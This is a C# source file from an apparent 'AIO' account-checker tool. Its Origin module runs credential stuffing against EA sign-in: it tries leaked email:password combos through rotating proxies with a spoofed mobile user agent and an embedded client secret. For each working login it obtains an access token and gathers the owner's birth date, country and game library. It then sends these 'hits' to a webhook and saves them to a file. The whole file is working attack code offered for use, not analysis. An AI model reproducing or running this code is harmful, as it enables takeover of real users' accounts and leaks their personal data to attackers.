using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class Originmod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.UserAgent = "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G950F Build/NRD90M)";
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = true;
                            req.SslCertificateValidatorCallback += (obj, cert, ssl, error) =>
                                (cert as X509Certificate2).Verify();
                            var httpResponse = req.Get(
                                "https://signin.ea.com/p/originX/login?execution=e1633018870s1&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fclient_id%3DORIGIN_PC%26response_type%3Dcode%2Bid_token%26redirect_uri%3Dqrc%253A%252F%252F%252Fhtml%252Flogin_successful.html%26display%3DoriginX%252Flogin%26locale%3Den_US%26nonce%3D1256%26pc_machine_id%3D15173374696391813834");
                            req.AllowAutoRedirect = true;
                            var address = httpResponse["SelfLocation"];
                            var str1 = "email=" + array[0] + "&password=" + array[1] +
                                       "&_eventId=submit&cid=6beCmB9ucTISOiFl2iTqx0IDZTklkePP&showAgeUp=true&googleCaptchaResponse=&_rememberMe=on&_loginInvisible=on";
                            var source1 = req.Post(address, str1, "application/x-www-form-urlencoded").ToString();
                            if (!source1.Contains("Your credentials are incorrect"))
                            {
                                if (source1.Contains("latestSuccessLogin"))
                                {
                                    var str2 = Parse(source1, "fid=", "\";");
                                    var str3 = Parse(
                                        req.Get(
                                            "https://accounts.ea.com/connect/auth?client_id=ORIGIN_PC&response_type=code+id_token&redirect_uri=qrc%3A%2F%2F%2Fhtml%2Flogin_successful.html&display=originX%2Flogin&locale=en_US&nonce=1256&pc_machine_id=15173374696391813834&fid=" +
                                            str2)["Location"], "code=", "&id");
                                    var source2 = req.Post("https://accounts.ea.com/connect/token",
                                        "grant_type=authorization_code&code=" + str3 +
                                        "&client_id=ORIGIN_PC&client_secret=UIY8dwqhi786T78ya8Kna78akjcp0s&redirect_uri=qrc:///html/login_successful.html",
                                        "application/x-www-form-urlencoded").ToString();
                                    if (source2.Contains("access_token\""))
                                    {
                                        var str4 = Parse(source2, "access_token\" : \"", "\",");
                                        req.AddHeader("Authorization", "Bearer " + str4);
                                        var source3 = req.Get("https://gateway.ea.com/proxy/identity/pids/me")
                                            .ToString();
                                        if (source3.Contains("country\""))
                                        {
                                            var str5 = Parse(source3, "dob\" : \"", "\",");
                                            var str6 = Parse(source3, "country\" : \"", "\",");
                                            var str7 = Parse(source3, "pidId\" : ", ",");
                                            req.AddHeader("Accept", "application/vnd.origin.v2+json");
                                            req.AddHeader("AuthToken", str4);
                                            req.AddHeader("User-Agent",
                                                "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G950F Build/NRD90M)");
                                            var self = req.Get("https://api1.origin.com/ecommerce2/basegames/" + str7 +
                                                               "?machine_hash=17524622993368447356").ToString();
                                            var stringList = new List<string>();
                                            if (self.Contains("offerPath\" : \"/"))
                                            {
                                                foreach (var substring in self.Substrings("offerPath\" : \"/", "\","))
                                                    stringList.Add(substring);
                                                var str8 = string.Join(" |game| ", stringList);
                                                Program.Hits++;
                                                Program.TotalChecks++;
                                                if (Settings.sendToWebhook)
                                                    Settings.sendTowebhook1(
                                                        array[0] + ":" + array[1] + " | Country: " + str6 + " | Dob: " +
                                                        str5 + " | Games: " + str8, "Origin");
                                                Export.AsResult("/Origin_hits",
                                                    array[0] + ":" + array[1] + " | Country: " + str6 + " | Dob: " +
                                                    str5 + " | Games: " + str8);
                                                if (Program.lorc == "LOG")
                                                    Settings.PrintHit("Origin",
                                                        array[0] + ":" + array[1] + " | Country: " + str6 + " | Dob: " +
                                                        str5 + " | Games: " + str8);
                                                if (Settings.sendToWebhook)
                                                    Settings.sendTowebhook1(
                                                        array[0] + ":" + array[1] + " | Country: " + str6 + " | Dob: " +
                                                        str5 + " | Games: " + str8, "Origin Hits");
                                            }
                                        }
                                    }
                                }
                            }
                            else if (source1.Contains("Your credentials are incorrect"))
                            {
                                Program.TotalChecks++;
                                Program.Fails++;
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}